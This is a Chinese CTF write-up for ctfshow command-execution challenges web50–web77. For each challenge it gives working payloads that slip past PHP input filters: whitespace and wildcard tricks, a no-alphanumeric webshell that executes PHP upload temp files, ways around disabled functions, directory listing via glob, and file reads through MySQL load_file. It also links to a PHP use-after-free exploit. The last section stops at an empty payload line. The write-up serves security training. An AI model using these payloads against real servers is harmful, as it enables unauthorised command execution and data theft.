<h2 id="web50"><a href="#web50" class="headerlink" title="web50"></a>web50</h2><p><img src="/2021/11/19/ctfshow-%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C/Users/23627/Pictures/Saved%20Pictures/chrome_V0tRJ1q5Ui-163730173518323.png" alt="chrome_V0tRJ1q5Ui"></p>
<p>比上题多过滤了%09和%26,不知道为啥通配符用不了了，替换一下</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">payload：c=tac&lt;fla\g.php||</span><br></pre></td></tr></table></figure>



<h2 id="web51"><a href="#web51" class="headerlink" title="web51"></a>web51</h2><p><img src="/2021/11/19/ctfshow-%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C/Users/23627/Pictures/Saved%20Pictures/chrome_JOHjOEPkGt-163730173518324.png" alt="chrome_JOHjOEPkGt"></p>
<p>比上题多过滤了tac，替换一下</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">payload：c=nl&lt;fla\g.php||</span><br></pre></td></tr></table></figure>



<h2 id="web52"><a href="#web52" class="headerlink" title="web52"></a>web52</h2><p><img src="/2021/11/19/ctfshow-%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C/Users/23627/Pictures/Saved%20Pictures/chrome_AAaXDZSZeS-163730173518325.png" alt="chrome_AAaXDZSZeS"></p>
<p>这个题<code>&lt;&gt;</code>被过滤了但是<code>$</code>没过滤，替换一下</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">payload：c=nl$&#123;IFS&#125;fla\g.php||</span><br></pre></td></tr></table></figure>

<p>发现不对flag_here,看一下根目录，<code>c=ls$&#123;IFS&#125;/||</code>,查看根目录下的flag</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">payload：c=nl$&#123;IFS&#125;fla\g||</span><br></pre></td></tr></table></figure>



<h2 id="web53"><a href="#web53" class="headerlink" title="web53"></a>web53</h2><p><img src="/2021/11/19/ctfshow-%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C/Users/23627/Pictures/Saved%20Pictures/chrome_yCHdHbvhHo-163730173518326.png" alt="chrome_yCHdHbvhHo"></p>
<p>多过滤了wget，但是没了命令分割</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">payload：c=nl$&#123;IFS&#125;fla\g.php</span><br></pre></td></tr></table></figure>



<h2 id="web54"><a href="#web54" class="headerlink" title="web54"></a>web54</h2><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;c&#x27;</span>]))&#123;</span><br><span class="line">    <span class="variable">$c</span>=<span class="variable">$_GET</span>[<span class="string">&#x27;c&#x27;</span>];</span><br><span class="line">    <span class="keyword">if</span>(!preg_match(<span class="string">&quot;/\;|.*c.*a.*t.*|.*f.*l.*a.*g.*| |[0-9]|\*|.*m.*o.*r.*e.*|.*w.*g.*e.*t.*|.*l.*e.*s.*s.*|.*h.*e.*a.*d.*|.*s.*o.*r.*t.*|.*t.*a.*i.*l.*|.*s.*e.*d.*|.*c.*u.*t.*|.*t.*a.*c.*|.*a.*w.*k.*|.*s.*t.*r.*i.*n.*g.*s.*|.*o.*d.*|.*c.*u.*r.*l.*|.*n.*l.*|.*s.*c.*p.*|.*r.*m.*|\`|\%|\x09|\x26|\&gt;|\&lt;/i&quot;</span>, <span class="variable">$c</span>))&#123;</span><br><span class="line">        system(<span class="variable">$c</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;<span class="keyword">else</span>&#123;</span><br><span class="line">    highlight_file(<span class="keyword">__FILE__</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>这个题太长了，直接把源码粘出来</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">grep <span class="built_in">test</span> *file   <span class="comment">#在当前目录中，查找后缀有 file 字样的文件中包含 test 字符串的文件，并打印出该字符串的行</span></span><br></pre></td></tr></table></figure>

<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">payload：c=grep$&#123;IFS&#125;&#x27;&#123;&#x27;$&#123;IFS&#125;fla?.php</span><br></pre></td></tr></table></figure>



<h2 id="web55"><a href="#web55" class="headerlink" title="web55"></a>web55</h2><p><img src="/2021/11/19/ctfshow-%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C/Users/23627/Pictures/Saved%20Pictures/chrome_nE9fbnd0nW-163730173518327.png" alt="chrome_nE9fbnd0nW"></p>
<p>过滤了</p>
<figure class="highlight basic"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">|;|小写字母|`|%|x09(空格)|x26(&amp;)|&lt;|&gt;|</span><br></pre></td></tr></table></figure>

<p>没有过滤数字，我们就想一想查看文件的命令有没有数字开头的。发现存在一个base64<br>我们就可以通过通配符进行匹配命令执行查看flag.php</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">payload：c=/???/????64 ????.???</span><br></pre></td></tr></table></figure>

<p>意思是 <code>/bin/base64 flag.php</code></p>
<h2 id="web56"><a href="#web56" class="headerlink" title="web56"></a>web56</h2><p><img src="/2021/11/19/ctfshow-%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C/Users/23627/Pictures/Saved%20Pictures/chrome_VAMNWtB321-163730173518328.png" alt="chrome_VAMNWtB321"></p>
<p>典型的无字母数字RCE，多过滤了</p>
<figure class="highlight basic"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">|$|(|&#123;|<span class="string">&quot;|&#x27;|</span></span><br></pre></td></tr></table></figure>

<p>首先构造一个post上传文件的数据包,上传一个php文件，文件内容</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#!/bin/sh</span></span><br><span class="line">cat /<span class="keyword">var</span>/www/html/flag.php</span><br></pre></td></tr></table></figure>

<p>shell程序必须以<code>&quot;#!/bin/sh&quot;</code>开始，<code>#! /bin/sh </code>是指此脚本使用<code>/bin/sh</code>来解释执行，<code>#!</code>是特殊的表示符，其后面跟的是解释此脚本的shell的路径</p>
<p>上传php文件抓包</p>
<p>抓包之后添加参数<code>c=.%20/???/????????[@-[]</code>，多发包几次（因为并不一定生成的临时文件的最后一个字母就是大写字母），可以看到执行了命令</p>
<h4 id="补充P神师傅的无字母数字webshell，"><a href="#补充P神师傅的无字母数字webshell，" class="headerlink" title="补充P神师傅的无字母数字webshell，"></a>补充P神师傅的无字母数字webshell，</h4><p>​                                       <strong>–摘取自<a target="_blank" rel="noopener" href="https://www.leavesongs.com/PENETRATION/webshell-without-alphanum-advanced.html">https://www.leavesongs.com/PENETRATION/webshell-without-alphanum-advanced.html</a></strong></p>
<p>无字母、数字、<code>$</code>，在shell中仍然是一个难题。</p>
<p>此时我想到了两个有趣的Linux shell知识点：</p>
<ol>
<li>shell下可以利用<code>.</code>来执行任意脚本</li>
<li>Linux文件名支持用glob通配符代替</li>
</ol>
<p>第一点曾在《 <a target="_blank" rel="noopener" href="https://www.leavesongs.com/SHARE/some-tricks-from-my-secret-group.html">小密圈里的那些奇技淫巧</a> 》露出过一角，但我没细讲。<code>.</code>或者叫period，它的作用和source一样，就是用当前的shell执行一个文件中的命令。比如，当前运行的shell是bash，则<code>. file</code>的意思就是用bash执行file文件中的命令。</p>
<p>用<code>. file</code>执行文件，是不需要file有x权限的。那么，如果目标服务器上有一个我们可控的文件，那不就可以利用<code>.</code>来执行它了吗？</p>
<p>这个文件也很好得到，我们可以发送一个上传文件的POST包，此时PHP会将我们上传的文件保存在临时文件夹下，默认的文件名是<code>/tmp/phpXXXXXX</code>，文件名最后6个字符是随机的大小写字母。</p>
<p>第二个难题接踵而至，执行<code>. /tmp/phpXXXXXX</code>，也是有字母的。此时就可以用到Linux下的glob通配符：</p>
<ul>
<li><code>*</code>可以代替0个及以上任意字符</li>
<li><code>?</code>可以代表1个任意字符</li>
</ul>
<p>那么，<code>/tmp/phpXXXXXX</code>就可以表示为<code>/*/?????????</code>或<code>/???/?????????</code>。</p>
<p>但我们尝试执行<code>. /???/?????????</code>，却得到错误</p>
<p>这是因为，能够匹配上<code>/???/?????????</code>这个通配符的文件有很多</p>
<p>所有文件名都是小写，只有PHP生成的临时文件包含大写字母。那么答案就呼之欲出了，我们只要找到一个可以表示“大写字母”的glob通配符，就能精准找到我们要执行的文件。</p>
<p>翻开ascii码表，可见大写字母位于<code>@</code>与<code>[</code>之间，那么，我们可以利用<code>[@-[]</code>来表示大写字母</p>
<h2 id="web57"><a href="#web57" class="headerlink" title="web57"></a>web57</h2><p><img src="/2021/11/19/ctfshow-%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C/Users/23627/Pictures/Saved%20Pictures/chrome_Z0y7xbPThJ-163730173518329.png" alt="chrome_Z0y7xbPThJ"></p>
<figure class="highlight basic"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">|;|[a-z]|[<span class="number">0</span>-<span class="number">9</span>]|`|\|#|<span class="comment">&#x27;|&quot;|`|%|x09|x26|x0a|&gt;|&lt;|.|,|?|*|-|=|[|</span></span><br></pre></td></tr></table></figure>

<p>过滤了很多，而且限制了后缀,不难理解只要让c=36即可</p>
<p>看师傅们厉害的绕过</p>
<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">echo $&#123;_&#125; #返回上一次的执行结果`</span><br><span class="line">echo $(())    #0</span><br><span class="line">echo $((~$(())))     #~0是-1</span><br><span class="line"><span class="meta">$</span><span class="bash">(($((~$(())))$((~$(())))))     <span class="comment">#$((-1-1))即$$((-2))是-2</span></span></span><br><span class="line">echo $((~-37))       #~-37是36</span><br></pre></td></tr></table></figure>

<p>37个-1相减得到-37，再取反得到36</p>
<p>payload：</p>
<figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">c=$((~$(($((~$(())))$((~$(())))$((~$(())))$((~$(())))$((~$(())))$((~$(())))$((~$(())))$((~$(())))$((~$(())))$((~$(())))$((~$(())))$((~$(())))$((~$(())))$((~$(())))$((~$(())))$((~$(())))$((~$(())))$((~$(())))$((~$(())))$((~$(())))$((~$(())))$((~$(())))$((~$(())))$((~$(())))$((~$(())))$((~$(())))$((~$(())))$((~$(())))$((~$(())))$((~$(())))$((~$(())))$((~$(())))$((~$(())))$((~$(())))$((~$(())))$((~$(())))$((~$(())))))))</span><br></pre></td></tr></table></figure>

<p>不得不说，师傅们的知识全面，以前根本不知道这个知识点</p>
<h2 id="web58-65"><a href="#web58-65" class="headerlink" title="web58-65"></a>web58-65</h2><p><img src="/2021/11/19/ctfshow-%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C/Users/23627/Pictures/Saved%20Pictures/chrome_ICAAvcyJkT-163730173518330.png" alt="chrome_ICAAvcyJkT"></p>
<p>这几个题都一样，经测试，system被禁用，执行命令的函数被禁用</p>
<p>我们尝试直接读取文件</p>
<p>php读文件的函数有</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">readfile()			读取文件</span><br><span class="line">fpassthru()			读取文件</span><br><span class="line">highlight_file()	读文件</span><br><span class="line">show_source()		同上</span><br><span class="line">base64_decode()		base64解码</span><br><span class="line">strrev()			反转字符串</span><br></pre></td></tr></table></figure>

<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">payload：c=show_source(&#x27;flag.php&#x27;);</span><br></pre></td></tr></table></figure>



<h4 id="补充-羽师傅对于绕过disable-function的总结"><a href="#补充-羽师傅对于绕过disable-function的总结" class="headerlink" title="补充 羽师傅对于绕过disable function的总结"></a>补充 羽师傅对于绕过disable function的总结</h4><p>​                                                                                                                <strong>–摘取自<a target="_blank" rel="noopener" href="https://blog.csdn.net/miuzzx/article/details/108619930">https://blog.csdn.net/miuzzx/article/details/108619930</a></strong></p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br></pre></td><td class="code"><pre><span class="line">通过复制，重命名读取php文件内容（函数执行后，访问url/flag.txt）</span><br><span class="line">函数：</span><br><span class="line">copy()</span><br><span class="line">rename()</span><br><span class="line">用法：</span><br><span class="line">copy(<span class="string">&quot;flag.php&quot;</span>,<span class="string">&quot;flag.txt&quot;</span>);             </span><br><span class="line">rename(<span class="string">&quot;flag.php&quot;</span>,<span class="string">&quot;flag.txt&quot;</span>);           </span><br><span class="line"></span><br><span class="line">单一函数读文件内容：</span><br><span class="line">函数：</span><br><span class="line">file_get_contents()</span><br><span class="line">readfile()</span><br><span class="line">file()</span><br><span class="line">用法：</span><br><span class="line"><span class="built_in">echo</span> file_get_contents(<span class="string">&quot;flag.php&quot;</span>);           </span><br><span class="line">readfile(<span class="string">&quot;flag.php&quot;</span>);                         </span><br><span class="line">print_r(file(<span class="string">&quot;flag.php&quot;</span>));                    </span><br><span class="line"></span><br><span class="line">通过fopen读文件内容：</span><br><span class="line">函数：</span><br><span class="line">fread()</span><br><span class="line">fgets()</span><br><span class="line">fgetc()</span><br><span class="line">fgetss()</span><br><span class="line">fgetcsv()</span><br><span class="line">gpassthru()</span><br><span class="line">用法：</span><br><span class="line"><span class="variable">$a</span>=fopen(<span class="string">&quot;flag.php&quot;</span>,<span class="string">&quot;r&quot;</span>);<span class="keyword">while</span> (!feof(<span class="variable">$a</span>)) &#123;<span class="variable">$line</span> = fgetss(<span class="variable">$a</span>);<span class="built_in">echo</span> <span class="variable">$line</span>;&#125;       //php7.3版本后 该函数已不再被使用</span><br><span class="line"><span class="variable">$a</span>=fopen(<span class="string">&quot;flag.php&quot;</span>,<span class="string">&quot;r&quot;</span>);<span class="built_in">echo</span> fpassthru(<span class="variable">$a</span>);                                      </span><br><span class="line"><span class="variable">$a</span>=fopen(<span class="string">&quot;flag.php&quot;</span>,<span class="string">&quot;r&quot;</span>);<span class="built_in">echo</span> fread(<span class="variable">$a</span>,<span class="string">&quot;1000&quot;</span>);                                   </span><br><span class="line"><span class="variable">$a</span>=fopen(<span class="string">&quot;flag.php&quot;</span>,<span class="string">&quot;r&quot;</span>);<span class="keyword">while</span> (!feof(<span class="variable">$a</span>)) &#123;<span class="variable">$line</span> = fgets(<span class="variable">$a</span>);<span class="built_in">echo</span> <span class="variable">$line</span>;&#125;       </span><br><span class="line"><span class="variable">$a</span>=fopen(<span class="string">&quot;flag.php&quot;</span>,<span class="string">&quot;r&quot;</span>);<span class="keyword">while</span> (!feof(<span class="variable">$a</span>)) &#123;<span class="variable">$line</span> = fgetc(<span class="variable">$a</span>);<span class="built_in">echo</span> <span class="variable">$line</span>;&#125;        </span><br><span class="line"><span class="variable">$a</span>=fopen(<span class="string">&quot;flag.php&quot;</span>,<span class="string">&quot;r&quot;</span>);<span class="keyword">while</span> (!feof(<span class="variable">$a</span>)) &#123;<span class="variable">$line</span> = fgetcsv(<span class="variable">$a</span>);print_r(<span class="variable">$line</span>);&#125;  </span><br><span class="line"></span><br><span class="line">高亮显示php文件</span><br><span class="line">函数</span><br><span class="line">show_source()</span><br><span class="line">highlight_file()</span><br><span class="line">用法：</span><br><span class="line">show_source(<span class="string">&quot;flag.php&quot;</span>);                </span><br><span class="line">highlight_file(<span class="string">&quot;flag.php&quot;</span>);             </span><br></pre></td></tr></table></figure>



<h2 id="web66"><a href="#web66" class="headerlink" title="web66"></a>web66</h2><p><img src="/2021/11/19/ctfshow-%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C/Users/23627/Pictures/Saved%20Pictures/chrome_ZlxsZmr1sE-163730173518331.png" alt="chrome_ZlxsZmr1sE"></p>
<p>继续用show_source()，回显该函数被禁用</p>
<p>换一个继续读flag.php，发现位置不对，所以我们需要获取文件路径</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">payload：c=print_r(scandir(&quot;/&quot;));发现flag.txt</span><br><span class="line"></span><br><span class="line">payload：c=highlight_file(&#x27;/flag.txt&#x27;);拿到flag</span><br></pre></td></tr></table></figure>



<h2 id="web67"><a href="#web67" class="headerlink" title="web67"></a>web67</h2><p>题目相同</p>
<p>print_r()被禁用，换一个查目录</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">c=var_dump(scandir(&quot;/&quot;));发现flag.txt</span><br><span class="line"></span><br><span class="line">payload：c=highlight_file(&#x27;/flag.txt&#x27;);拿到flag</span><br></pre></td></tr></table></figure>



<h2 id="web68"><a href="#web68" class="headerlink" title="web68"></a>web68</h2><p>题目相同</p>
<p>文件显示的函数，比如show_source、highlight_file、file_get_contents等基本都被禁了，这里换成文件包含的即可，如include、require</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">c=var_dump(scandir(&quot;/&quot;));发现flag.txt</span><br><span class="line"></span><br><span class="line">payload：c=include(&#x27;/flag.txt&#x27;);拿到flag</span><br></pre></td></tr></table></figure>



<h2 id="web69"><a href="#web69" class="headerlink" title="web69"></a>web69</h2><p>var_dump()被禁用</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">c=var_export(scandir(&quot;/&quot;));发现flag.txt</span><br><span class="line"></span><br><span class="line">payload：c=include(&#x27;/flag.txt&#x27;);拿到flag</span><br></pre></td></tr></table></figure>



<h2 id="web70"><a href="#web70" class="headerlink" title="web70"></a>web70</h2><p>error_reporting() 、 ini_set()、 highlight_file()被禁用</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">c=var_export(scandir(&quot;/&quot;));发现flag.txt</span><br><span class="line"></span><br><span class="line">payload：c=include(&#x27;/flag.txt&#x27;);拿到flag</span><br></pre></td></tr></table></figure>



<h2 id="web71"><a href="#web71" class="headerlink" title="web71"></a>web71</h2><p><img src="/2021/11/19/ctfshow-%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C/Users/23627/Pictures/Saved%20Pictures/Code_QPS6Ju4ej7-163730173518332.png" alt="Code_QPS6Ju4ej7"></p>
<p>下载index.php</p>
<p>阅读源码</p>
<figure class="highlight basic"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">ob_get_contents — 返回输出缓冲区的内容</span><br><span class="line">ob_end_clean — 清空（擦除）缓冲区并关闭输出缓冲</span><br><span class="line"></span><br><span class="line">此函数丢弃最顶层输出缓冲区的内容并关闭这个缓冲区。如果想要进一步处理缓冲区的内容，必须在ob_end_clean()之前调用ob_get_contents()，因为当调用ob_end_clean()时缓冲区内容将被丢弃</span><br></pre></td></tr></table></figure>

<p>正则用?替换了数字和字母</p>
<p>通过exit();使程序提前退出，绕过后面的正则表达式</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">payload：c=include(&quot;/flag.txt&quot;);exit(0);</span><br></pre></td></tr></table></figure>



<h2 id="web72"><a href="#web72" class="headerlink" title="web72"></a>web72</h2><p>源码同上一题</p>
<p>hint</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">c=<span class="meta">?&gt;</span><span class="meta">&lt;?php</span></span><br><span class="line"><span class="variable">$a</span>=<span class="keyword">new</span> <span class="built_in">DirectoryIterator</span>(<span class="string">&quot;glob:///*&quot;</span>);</span><br><span class="line"><span class="keyword">foreach</span>(<span class="variable">$a</span> <span class="keyword">as</span> <span class="variable">$f</span>)</span><br><span class="line">&#123;<span class="keyword">echo</span>(<span class="variable">$f</span>-&gt;__toString().<span class="string">&#x27; &#x27;</span>);</span><br><span class="line">&#125; <span class="keyword">exit</span>(<span class="number">0</span>);</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>

<p>POST传入再通过抓包修改发送hint发现flag在flag0.txt,之后利用uaf的脚本（<a target="_blank" rel="noopener" href="https://github.com/mm0r1/exploits/tree/master/php7-backtrace-bypass%EF%BC%89%E8%BF%9B%E8%A1%8C%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C">https://github.com/mm0r1/exploits/tree/master/php7-backtrace-bypass）进行命令执行</a><br>这里的<code>?&gt;</code>是为了闭合前面<code>&lt;?php</code></p>
<h2 id="web73"><a href="#web73" class="headerlink" title="web73"></a>web73</h2><p>同上</p>
<p>先查目录</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">payload：c=<span class="meta">?&gt;</span><span class="meta">&lt;?php</span> <span class="variable">$a</span>=<span class="keyword">new</span> <span class="built_in">DirectoryIterator</span>(<span class="string">&quot;glob:///*&quot;</span>); <span class="keyword">foreach</span>(<span class="variable">$a</span> <span class="keyword">as</span> <span class="variable">$f</span>) &#123;<span class="keyword">echo</span>(<span class="variable">$f</span>-&gt;__toString().<span class="string">&#x27; &#x27;</span>); &#125;<span class="keyword">exit</span>(<span class="number">0</span>); <span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>

<p>发现有个flagc.txt文件</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">payload: c=include(&quot;/flagc.txt&quot;);exit();</span><br></pre></td></tr></table></figure>



<h2 id="web74"><a href="#web74" class="headerlink" title="web74"></a>web74</h2><p>先查目录</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">payload：c=<span class="meta">?&gt;</span><span class="meta">&lt;?php</span> <span class="variable">$a</span>=<span class="keyword">new</span> <span class="built_in">DirectoryIterator</span>(<span class="string">&quot;glob:///*&quot;</span>); <span class="keyword">foreach</span>(<span class="variable">$a</span> <span class="keyword">as</span> <span class="variable">$f</span>) &#123;<span class="keyword">echo</span>(<span class="variable">$f</span>-&gt;__toString().<span class="string">&#x27; &#x27;</span>); &#125;<span class="keyword">exit</span>(<span class="number">0</span>); <span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>

<p>发现有个flagx.txt文件</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">payload: c=include(&quot;/flagx.txt&quot;);exit();</span><br></pre></td></tr></table></figure>



<h2 id="web75"><a href="#web75" class="headerlink" title="web75"></a>web75</h2><p>先查目录</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">c=<span class="variable">$a</span>=<span class="keyword">new</span> <span class="built_in">DirectoryIterator</span>(<span class="string">&quot;glob:///*&quot;</span>);<span class="keyword">foreach</span>(<span class="variable">$a</span> <span class="keyword">as</span> <span class="variable">$f</span>)&#123;<span class="keyword">echo</span>(<span class="variable">$f</span>-&gt;__toString().<span class="string">&#x27; &#x27;</span>);&#125;<span class="keyword">exit</span>(<span class="number">0</span>);</span><br></pre></td></tr></table></figure>

<p>发现flag36.txt</p>
<p>利用<code>mysql load_file</code>读文件</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">c=<span class="keyword">try</span> &#123;<span class="variable">$dbh</span> = <span class="keyword">new</span> PDO(<span class="string">&#x27;mysql:host=localhost;dbname=ctftraining&#x27;</span>, <span class="string">&#x27;root&#x27;</span>,</span><br><span class="line"><span class="string">&#x27;root&#x27;</span>);<span class="keyword">foreach</span>(<span class="variable">$dbh</span>-&gt;query(<span class="string">&#x27;select load_file(&quot;/flag36.txt&quot;)&#x27;</span>) <span class="keyword">as</span> <span class="variable">$row</span>)</span><br><span class="line">&#123;<span class="keyword">echo</span>(<span class="variable">$row</span>[<span class="number">0</span>]).<span class="string">&quot;|&quot;</span>; &#125;<span class="variable">$dbh</span> = <span class="literal">null</span>;&#125;<span class="keyword">catch</span> (PDOException <span class="variable">$e</span>) &#123;<span class="keyword">echo</span> <span class="variable">$e</span>-</span><br><span class="line">&gt;getMessage();<span class="keyword">exit</span>(<span class="number">0</span>);&#125;<span class="keyword">exit</span>(<span class="number">0</span>);</span><br></pre></td></tr></table></figure>



<h2 id="web76"><a href="#web76" class="headerlink" title="web76"></a>web76</h2><p>先查目录</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">c=<span class="variable">$a</span>=<span class="keyword">new</span> <span class="built_in">DirectoryIterator</span>(<span class="string">&quot;glob:///*&quot;</span>);<span class="keyword">foreach</span>(<span class="variable">$a</span> <span class="keyword">as</span> <span class="variable">$f</span>)&#123;<span class="keyword">echo</span>(<span class="variable">$f</span>-&gt;__toString().<span class="string">&#x27; &#x27;</span>);&#125;<span class="keyword">exit</span>(<span class="number">0</span>);</span><br></pre></td></tr></table></figure>

<p>发现flag36d.txt</p>
<p>利用<code>mysql load_file</code>读文件</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">c=<span class="keyword">try</span> &#123;<span class="variable">$dbh</span> = <span class="keyword">new</span> PDO(<span class="string">&#x27;mysql:host=localhost;dbname=ctftraining&#x27;</span>, <span class="string">&#x27;root&#x27;</span>,</span><br><span class="line"><span class="string">&#x27;root&#x27;</span>);<span class="keyword">foreach</span>(<span class="variable">$dbh</span>-&gt;query(<span class="string">&#x27;select load_file(&quot;/flag36d.txt&quot;)&#x27;</span>) <span class="keyword">as</span> <span class="variable">$row</span>)</span><br><span class="line">&#123;<span class="keyword">echo</span>(<span class="variable">$row</span>[<span class="number">0</span>]).<span class="string">&quot;|&quot;</span>; &#125;<span class="variable">$dbh</span> = <span class="literal">null</span>;&#125;<span class="keyword">catch</span> (PDOException <span class="variable">$e</span>) &#123;<span class="keyword">echo</span> <span class="variable">$e</span>-</span><br><span class="line">&gt;getMessage();<span class="keyword">exit</span>(<span class="number">0</span>);&#125;<span class="keyword">exit</span>(<span class="number">0</span>);</span><br></pre></td></tr></table></figure>



<h2 id="web77"><a href="#web77" class="headerlink" title="web77"></a>web77</h2><p>先查目录</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">c=<span class="variable">$a</span>=<span class="keyword">new</span> <span class="built_in">DirectoryIterator</span>(<span class="string">&quot;glob:///*&quot;</span>);<span class="keyword">foreach</span>(<span class="variable">$a</span> <span class="keyword">as</span> <span class="variable">$f</span>)&#123;<span class="keyword">echo</span>(<span class="variable">$f</span>-&gt;__toString().<span class="string">&#x27; &#x27;</span>);&#125;<span class="keyword">exit</span>(<span class="number">0</span>);</span><br></pre></td></tr></table></figure>

<p>发现flag36x.txt</p>
<p>发现有一个<code>readflag</code>肯定是要调用这个,看了这个FFI拓展,不太懂</p>
<p>payload：</p>
